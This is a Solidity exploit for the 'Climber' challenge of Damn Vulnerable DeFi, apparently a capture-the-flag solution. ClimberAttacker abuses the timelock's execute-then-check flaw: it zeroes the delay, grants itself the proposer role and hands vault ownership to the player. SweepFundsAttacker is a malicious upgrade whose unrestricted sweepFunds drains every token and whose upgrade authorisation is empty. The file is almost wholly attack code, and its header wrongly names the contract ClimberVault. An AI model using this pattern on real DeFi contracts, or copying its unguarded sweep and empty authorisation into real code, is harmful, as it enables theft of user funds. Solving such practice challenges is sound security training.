// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "./ClimberVault.sol";
import "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";

/**
 * @title ClimberVault
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberAttacker {
    address payable climberVault;
    address payable climberTimeLock;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(
        address payable climberVault_,
        address payable climberTimeLock_,
        address payable playerAttacker
    ) {
        climberVault = climberVault_;
        climberTimeLock = climberTimeLock_;

        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        targets[0] = address(climberTimeLock_);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[1] = (address(climberTimeLock_));
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        targets[2] = (address(climberVault));
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature(
            "transferOwnership(address)",
            playerAttacker
        );

        // targets[3] = address(climberVault);
        // values[3] = 0;
        // dataElements[3] = abi.encodeWithSignature(
        //     "upgradeTo(address)",
        //     sweepFundsAttacker
        // );

        targets[3] = (address(this));
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("schedule()");
    }

    function exploit() external {
        ClimberTimelock(climberTimeLock).execute(
            targets,
            values,
            dataElements,
            "SALT"
        );
    }

    function schedule() external {
        ClimberTimelock(climberTimeLock).schedule(
            targets,
            values,
            dataElements,
            "SALT"
        );
    }
}

contract SweepFundsAttacker is
    Initializable,
    OwnableUpgradeable,
    UUPSUpgradeable
{
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address token) external {
        SafeTransferLib.safeTransfer(
            token,
            msg.sender,
            IERC20(token).balanceOf(address(this))
        );
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
